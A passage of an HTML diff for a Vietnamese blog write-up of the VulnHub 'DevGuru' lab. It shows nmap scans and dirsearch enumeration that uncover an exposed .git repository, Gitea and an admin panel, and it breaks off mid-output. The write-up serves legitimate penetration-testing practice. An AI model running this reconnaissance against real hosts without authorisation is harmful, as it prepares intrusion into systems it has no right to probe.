@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: DevGuruDifficulty: Intermediate (Depends on experience)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] DevGuru">
+<meta property="og:url" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: DevGuruDifficulty: Intermediate (Depends on experience)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/devguru-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic3.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic4.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/pic8.png">
+<meta property="article:published_time" content="2020-12-27T14:21:27.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.535Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="medium">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/devguru-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2020/12/27/devguru-vulnhub/","path":"2020/12/27/devguru-vulnhub/","title":"[VulnHub] DevGuru"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] DevGuru | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Git-Dumper"><span class="nav-number">2.2.</span> <span class="nav-text">Git Dumper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LinPEAS"><span class="nav-number">2.3.</span> <span class="nav-text">LinPEAS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">3.</span> <span class="nav-text">Privileges Escalation</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2020/12/27/devguru-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] DevGuru | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] DevGuru
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-12-27 21:21:27" itemprop="dateCreated datePublished" datetime="2020-12-27T21:21:27+07:00">2020-12-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>20 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/devguru-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/devguru-1,620/">DevGuru</a><br>Difficulty: <em>Intermediate (Depends on experience)</em></p>
+<span id="more"></span>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Đầu tiên, vẫn là phải kiếm xem địa chỉ IP của machine này là gì.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap 10.10.10.0/24</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 21:20 +07</span><br><span class="line">Nmap scan report for 10.10.10.13</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 3.12 seconds</span><br></pre></td></tr></table></figure>
+<p>Yep. 10.10.10.13. Giờ thì liệt kê đống port đang public.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p- 10.10.10.13</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 20:04 +07</span><br><span class="line">Nmap scan report for 10.10.10.13</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8585/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds</span><br></pre></td></tr></table></figure>
+<p>Ở đây có 3 cổng, với 2 cổng quen thuộc là 22-SSH và 80-HTTP, cổng 8585 chạy gì đó chưa biết, mò xem nó chạy cái quần què gì.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 22,80,8585 -sV -sC 10.10.10.13</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 21:20 +07</span><br><span class="line">Nmap scan report for 10.10.10.11</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)</span><br><span class="line">|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)</span><br><span class="line">|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-generator: DevGuru</span><br><span class="line">| http-git: </span><br><span class="line">|   10.10.10.11:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...</span><br><span class="line">|     Last commit message: Update config </span><br><span class="line">|     Remotes:</span><br><span class="line">|       http://devguru.local:8585/frank/devguru-website.git</span><br><span class="line">|_    Project type: PHP application (guessed from .gitignore)</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Corp - DevGuru</span><br><span class="line">8585/tcp open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gitea=f5cb85ba00f5ac55; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=eq2VCGxTulo0mUCtx873_fFheTc6MTYwOTEwNDA0MjgwMDY1Mzk3NA; Path=/; Expires=Mon, 28 Dec 2020 21:20:42 GMT; HttpOnly</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Sun, 27 Dec 2020 21:20:42 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt;</span><br><span class="line">|     &lt;head data-suburl=&quot;&quot;&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;</span><br><span class="line">|     &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&gt;</span><br><span class="line">|     &lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a cup of tea) is a painless</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gitea=f37dba54c746a30d; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=ga_W3gROV5xX9EySESK1ME01kAQ6MTYwOTEwNDA0MjgxNzgyMTExMA; Path=/; Expires=Mon, 28 Dec 2020 21:20:42 GMT; HttpOnly</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Sun, 27 Dec 2020 21:20:42 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt;</span><br><span class="line">|     &lt;head data-suburl=&quot;&quot;&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;</span><br><span class="line">|     &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&gt;</span><br><span class="line">|_    &lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a c</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8585-TCP:V=7.91%I=7%D=12/27%Time=5FE8983C%P=x86_64-pc-linux-gnu%...</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 89.14 seconds</span><br></pre></td></tr></table></figure>
+<p>Có thể thấy cổng 8585 đang chạy dịch vụ HTTP, nhưng chưa biết chính xác nó là gì, phiên bản bao nhiêu, biết thế cái đã.<br>Vào thử web trên cổng 8585.<br><img src="/2020/12/27/devguru-vulnhub/pic6.png"><br>Okay, Gitea, nó giống như Github, một nơi lưu trữ và quản lý source code. Cứ kệ đấy cái đã, giờ vào cái web trên cổng 80 coi mặt mũi nó ra sao.<br><img src="/2020/12/27/devguru-vulnhub/pic1.png"><br>Một trang landing, không có gì nhiều ở đây cả. Liệt kê các thư mục và tệp tin của cái web này ra xem có vẹo gì nữa không.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./dirsearch.py -u http://10.10.10.13/ -e html,php,txt -x 403</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 9791</span><br><span class="line">Error Log: #</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.11/</span><br><span class="line">Output File: #</span><br><span class="line"></span><br><span class="line">[21:28:10] Starting: </span><br><span class="line">[21:28:14] 301 -  309B  - /.git  -&gt;  http://10.10.10.11/.git/</span><br><span class="line">[21:28:14] 200 -   14B  - /.git/COMMIT_EDITMSG</span><br><span class="line">[21:28:14] 200 -   23B  - /.git/HEAD</span><br><span class="line">[21:28:14] 200 -  276B  - /.git/config</span><br><span class="line">[21:28:14] 200 -  109B  - /.git/FETCH_HEAD</span><br><span class="line">[21:28:14] 200 -   73B  - /.git/description</span><br><span class="line">[21:28:14] 200 -  240B  - /.git/info/exclude</span><br><span class="line">[21:28:14] 200 -    1MB - /.git/index</span><br><span class="line">[21:28:14] 200 -  307B  - /.git/logs/HEAD</span><br><span class="line">[21:28:14] 301 -  325B  - /.git/logs/refs/heads  -&gt;  http://10.10.10.11/.git/logs/refs/heads/</span><br><span class="line">[21:28:14] 301 -  319B  - /.git/logs/refs  -&gt;  http://10.10.10.11/.git/logs/refs/</span><br><span class="line">[21:28:14] 200 -  307B  - /.git/logs/refs/heads/master</span><br><span class="line">[21:28:14] 301 -  327B  - /.git/logs/refs/remotes  -&gt;  http://10.10.10.11/.git/logs/refs/remotes/</span><br><span class="line">[21:28:14] 301 -  334B  - /.git/logs/refs/remotes/origin  -&gt;  http://10.10.10.11/.git/logs/refs/remotes/origin/</span><br><span class="line">[21:28:14] 200 -  284B  - /.git/logs/refs/remotes/origin/master</span><br><span class="line">[21:28:14] 301 -  320B  - /.git/refs/heads  -&gt;  http://10.10.10.11/.git/refs/heads/</span><br><span class="line">[21:28:14] 301 -  322B  - /.git/refs/remotes  -&gt;  http://10.10.10.11/.git/refs/remotes/</span><br><span class="line">[21:28:14] 301 -  329B  - /.git/refs/remotes/origin  -&gt;  http://10.10.10.11/.git/refs/remotes/origin/</span><br><span class="line">[21:28:14] 200 -  173B  - /.git/packed-refs</span><br><span class="line">[21:28:14] 301 -  319B  - /.git/refs/tags  -&gt;  http://10.10.10.11/.git/refs/tags/</span><br><span class="line">[21:28:14] 200 -   41B  - /.git/refs/remotes/origin/master</span><br><span class="line">[21:28:14] 200 -  413B  - /.gitignore</span><br><span class="line">[21:28:15] 200 -    2KB - /.htaccess</span><br><span class="line">[21:28:21] 200 -   12KB - /0</span><br><span class="line">[21:28:23] 200 -   18KB - /About</span><br><span class="line">[21:28:26] 200 -    1KB - /README.md</span><br><span class="line">[21:28:30] 200 -   18KB - /about</span><br><span class="line">[21:28:38] 200 -    4KB - /adminer.php</span><br><span class="line">[21:28:43] 302 -  402B  - /backend/  -&gt;  http://10.10.10.11/backend/backend/auth</span><br><span class="line">[21:28:47] 301 -  311B  - /config  -&gt;  http://10.10.10.11/config/</span><br><span class="line">[21:29:51] 200 -   12KB - /index.php</span><br><span class="line">[21:29:56] 301 -  312B  - /modules  -&gt;  http://10.10.10.11/modules/</span><br><span class="line">[21:30:03] 301 -  312B  - /plugins  -&gt;  http://10.10.10.11/plugins/</span><br><span class="line">[21:30:07] 200 -   10KB - /services</span><br><span class="line">[21:30:07] 200 -   10KB - 